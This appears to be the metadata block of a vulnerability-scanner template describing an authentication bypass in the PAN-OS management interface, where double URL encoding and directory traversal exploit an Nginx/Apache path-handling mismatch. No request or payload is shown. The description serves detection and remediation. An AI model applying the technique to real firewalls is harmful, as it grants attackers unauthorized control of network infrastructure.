  name: PAN-OS Management Interface - Path Confusion to Authentication Bypass
  author: halencarjunior,ritikchaddha
  severity: critical
  description: |
    A vulnerability in PAN-OS management interface allows authentication bypass through path confusion between Nginx and Apache handlers.The issue occurs due to differences in path processing between Nginx and Apache, where double URL encoding combined with directory traversal can bypass authentication checks enforced by X-pan-AuthCheck header.
  impact: |
    Unauthenticated attackers can exploit path confusion between Nginx and Apache to bypass authentication completely, gaining unauthorized access to the PAN-OS management interface and potentially compromising the entire firewall infrastructure.
  remediation: |
    Upgrade to the patched version of PAN-OS as specified in the vendor security advisory.
